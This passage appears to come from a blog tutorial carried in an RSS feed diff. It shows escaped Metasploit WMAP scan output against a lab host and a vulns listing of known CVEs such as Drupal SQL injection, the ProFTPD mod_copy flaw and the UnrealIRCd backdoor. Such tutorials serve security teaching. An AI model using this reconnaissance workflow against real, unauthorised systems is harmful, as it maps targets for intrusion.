+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/file_same_name_dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Blank or default PATH set.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/files_dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .backup
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .bak
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .cfg
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .class
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .copy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .htm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .ini
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .log
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .old
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .orig
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .tar
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .tar.gz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .tgz
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .tmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .temp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension .zip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension ~
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/chat &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/phpmyadmin &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/uploads &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> files with extension
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/chat &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/phpmyadmin &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/uploads &lt;span class="m">301&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_put
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> 10.0.2.28: File doesn&lt;span class="err">&amp;#39;&lt;/span>t seem to exist. The upload probably failed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> 10.0.2.28:80 Folder does not require authentication. &lt;span class="o">[&lt;/span>405&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/prev_dir_same_name_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Blank or default PATH set.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/replace_ext
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/soap_xml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting scan with 0ms delay between requests
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Server 10.0.2.28:80 returned HTTP &lt;span class="m">404&lt;/span> &lt;span class="k">for&lt;/span> /. Use a different one.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/trace_axd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/verb_auth_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Unique Query testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/vmware/vcenter_forge_saml_token
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/blind_sql_query
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/error_sql_injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_traversal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/rails_mass_assignment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module exploit/multi/http/lcms_php_exec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Query testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> General testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Launch completed in 226.5683000087738 seconds.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Done.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="type-the-wmap_vulns--l-command-to-display-the-results-of-the-scan">Type the wmap_vulns -l command to display the results of the scan
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; vulns
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Vulnerabilities&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Timestamp Host Name References
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--------- ---- ---- ----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-02-19 10:00:51 UTC 10.0.2.28 Drupal HTTP Parameter Key/Value SQL Injection CVE-2014-3704,URL-https://www.drupal.org/SA-CORE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -2014-005,URL-http://www.sektioneins.de/en/advis
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ories/advisory-012014-drupal-pre-auth-sql-inject
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ion-vulnerability.html,URL-https://www.whitewint
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> erwolf.com/posts/2017/11/16/drupageddon-revisite
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> d-a-new-path-from-sql-injection-to-remote-comman
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> d-execution-cve-2014-3704/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-02-19 14:37:58 UTC 10.0.2.28 ProFTPD 1.3.5 Mod_Copy Command Execution CVE-2015-3306,EDB-36742,URL-http://bugs.proftpd.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> org/show_bug.cgi?id&lt;span class="o">=&lt;/span>&lt;span class="m">4169&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-02-20 12:30:10 UTC 10.0.2.28 UnrealIRCD 3.2.8.1 Backdoor Command Execution CVE-2010-2075,OSVDB-65445,URL-http://www.unreali
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> rcd.com/txt/unrealsecadvisory.20100612.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-02-20 13:01:20 UTC 10.0.2.28 SSH Login Check Scanner CVE-1999-0502
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-02-21 03:19:30 UTC 10.0.2.28 Generic Payload Handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-04 14:54:11 UTC 10.0.2.28 phpMyAdmin Authenticated Remote Code Execution v CVE-2013-3238,EDB-25003,OSVDB-92793,URL-http://w
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ia preg_replace&lt;span class="o">()&lt;/span> ww.waraxe.us/advisory-103.html,URL-http://www.ph
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pmyadmin.net/home_page/security/PMASA-2013-2.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-04 14:59:03 UTC 10.0.2.28 Ruby on Rails ActionPack Inline ERB Code Executi CVE-2016-2098
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> on
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2024-03-05 05:18:00 UTC 10.0.2.28 HTTP Host Header Injection Detection CVE-2016-10073,URL-http://www.skeletonscribe.net
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /2013/05/practical-http-host-header-attacks.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
